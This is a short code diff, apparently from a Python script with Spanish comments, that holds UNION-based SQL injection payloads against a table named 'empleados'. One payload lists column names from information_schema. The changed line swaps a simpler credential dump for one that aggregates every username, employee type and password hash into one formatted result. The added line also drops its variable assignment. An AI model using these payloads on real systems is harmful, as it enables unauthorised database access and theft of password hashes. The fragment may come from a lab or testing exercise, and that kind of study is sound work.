@@ -5,4 +5,4 @@
             codigo_diagnostico = "VALOR_FALSO' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='empleados' --"
             
 #Payload que devuelve los datos de la tabla empleado (SQL Injection)
-            codigo_diagnostico = "VALOR_FALSO' UNION SELECT password_hash, usuario, tipo_empleado FROM empleados --"
+            "VALOR_FALSO' UNION SELECT (SELECT STRING_AGG(RPAD(usuario, 15, ' ') || ' | ' || RPAD(tipo_empleado, 15, ' ') || ' | ' || password_hash, CHR(10)) FROM empleados), NULL, NULL --"
